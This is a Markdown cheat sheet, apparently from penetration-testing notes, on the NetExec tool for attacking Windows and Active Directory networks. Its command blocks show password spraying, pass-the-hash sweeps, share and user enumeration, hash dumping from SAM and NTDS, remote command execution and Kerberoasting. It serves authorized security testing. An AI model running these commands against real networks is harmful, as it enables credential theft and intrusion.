# NetExec (nxc)

NetExec is the actively maintained successor to CrackMapExec. It is the Swiss-army knife for attacking Windows networks at scale: spray credentials, enumerate shares and users, dump hashes, and run commands across a whole subnet in one line. If you do internal/[Active Directory](../Active%20Directory/Active%20Directory%20Basics.md) work, you will live in this tool.

## Install

```bash
pipx install netexec
# then use the `nxc` command
nxc --help
```

## Protocols

`nxc smb|ldap|winrm|mssql|ssh|ftp|rdp|wmi ...` - SMB is the most used.

## Credential checks and spraying

```bash
# Validate a credential across a subnet (find where it is valid/admin)
nxc smb 10.0.0.0/24 -u administrator -p 'Password1'

# Pass-the-hash sweep
nxc smb 10.0.0.0/24 -u administrator -H <NThash>

# Password spray one password against many users
nxc smb 10.0.0.5 -u users.txt -p 'Spring2026!' --continue-on-success
```

`(Pwn3d!)` in the output means that account is **local admin** on that host.

## Enumeration

```bash
nxc smb 10.0.0.5 -u user -p pass --shares        # readable/writable shares
nxc smb 10.0.0.5 -u user -p pass --users         # domain users
nxc smb 10.0.0.5 -u user -p pass --groups
nxc smb 10.0.0.5 -u '' -p '' --shares            # null session
nxc ldap 10.0.0.1 -u user -p pass --bloodhound --collection All   # feed BloodHound
```

## Post-exploitation

```bash
# Dump SAM / LSA / NTDS where you are admin
nxc smb 10.0.0.5 -u administrator -H <hash> --sam
nxc smb 10.0.0.5 -u administrator -H <hash> --ntds

# Run a command / grab Kerberoastable accounts
nxc smb 10.0.0.5 -u administrator -H <hash> -x "whoami /all"
nxc ldap 10.0.0.1 -u user -p pass --kerberoasting kerb.txt
```

## Tips

- Modules: `nxc smb -L` lists modules (lsassy, spider_plus, etc.).
- Pair with [Impacket](Impacket.md) for targeted exploitation and [BloodHound](../Active%20Directory/BloodHound.md) for path analysis.
- Feed dumped hashes to [Hashcat](Hashcat.md) or reuse them with [Pass-the-Hash](../Active%20Directory/Pass-the-Hash.md).

## Resources

- [NetExec docs](https://www.netexec.wiki/)
